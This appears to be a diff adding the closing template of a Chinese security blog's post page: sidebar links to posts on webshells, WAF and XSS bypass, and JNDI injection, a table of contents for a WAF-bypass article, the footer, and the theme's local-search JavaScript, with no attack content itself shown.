+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <!-- modify icon to fire by szw -->
+                <i class="fa fa-history fa-" aria-hidden="true"></i>
+                近期文章
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/08/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="jsp一句话木马/jsp一句话木马" target="_blank">jsp一句话木马/jsp一句话木马</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/05/waf%20bypass/waf%20bypass%E6%8A%80%E5%B7%A7/" title="waf bypass/waf bypass技巧" target="_blank">waf bypass/waf bypass技巧</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/04/XSS%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/XSS%E6%B7%B1%E5%85%A5/" title="XSS绕过总结/XSS深入" target="_blank">XSS绕过总结/XSS深入</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/12/02/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集/信息收集" target="_blank">信息收集/信息收集</a>
+                  </li>
+                
+                  <li class="recent_posts_li">
+                    <a href="/2020/11/30/JAVA%20JNDI%E6%B3%A8%E5%85%A5/JAVA%20JNDI%E6%B3%A8%E5%85%A5/" title="JAVA JNDI注入/JAVA JNDI注入" target="_blank">JAVA JNDI注入/JAVA JNDI注入</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Waf-Bypass技巧"><span class="nav-number">1.</span> <span class="nav-text">Waf Bypass技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一、利用服务器特性"><span class="nav-number">1.2.</span> <span class="nav-text">一、利用服务器特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、-特性（ASP-IIS）"><span class="nav-number">1.2.1.</span> <span class="nav-text">1、%特性（ASP+IIS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-u特性（asp-iis和aspx-iis）"><span class="nav-number">1.2.2.</span> <span class="nav-text">2、%u特性（asp+iis和aspx+iis）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、另类-u特性（ASP-IIS）"><span class="nav-number">1.2.3.</span> <span class="nav-text">3、另类%u特性（ASP+IIS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、apache畸形method"><span class="nav-number">1.2.4.</span> <span class="nav-text">4、apache畸形method</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、应用层特性"><span class="nav-number">1.3.</span> <span class="nav-text">二、应用层特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、大小写-关键词的替换。"><span class="nav-number">1.3.1.</span> <span class="nav-text">1、大小写&#x2F;关键词的替换。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、双重url编码"><span class="nav-number">1.3.2.</span> <span class="nav-text">2、双重url编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、变更请求方式"><span class="nav-number">1.3.3.</span> <span class="nav-text">3、变更请求方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、HPP参数污染-重点"><span class="nav-number">1.3.4.</span> <span class="nav-text">4、HPP参数污染(重点)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、宽字节（利用度不高）"><span class="nav-number">1.3.5.</span> <span class="nav-text">5、宽字节（利用度不高）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、WAF层特性"><span class="nav-number">1.4.</span> <span class="nav-text">三、WAF层特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、逻辑问题"><span class="nav-number">1.4.1.</span> <span class="nav-text">1、逻辑问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、性能问题"><span class="nav-number">1.4.2.</span> <span class="nav-text">2、性能问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、白名单"><span class="nav-number">1.4.3.</span> <span class="nav-text">3、白名单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、数据库特性"><span class="nav-number">1.5.</span> <span class="nav-text">四、数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、Mysql数据库特性"><span class="nav-number">1.5.1.</span> <span class="nav-text">1、Mysql数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-测试"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">0x02 测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、-SQLServer数据库特性"><span class="nav-number">1.5.2.</span> <span class="nav-text">2、 SQLServer数据库特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-特性"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">0x02 特性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-测试"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">0x03 测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-常见函数"><span class="nav-number">1.5.2.3.</span> <span class="nav-text">0x03 常见函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-总结"><span class="nav-number">1.5.2.4.</span> <span class="nav-text">0x04 总结</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-id-card"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Virusday</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">50k</span>
+  
+</div>
+-->
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Virusday</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
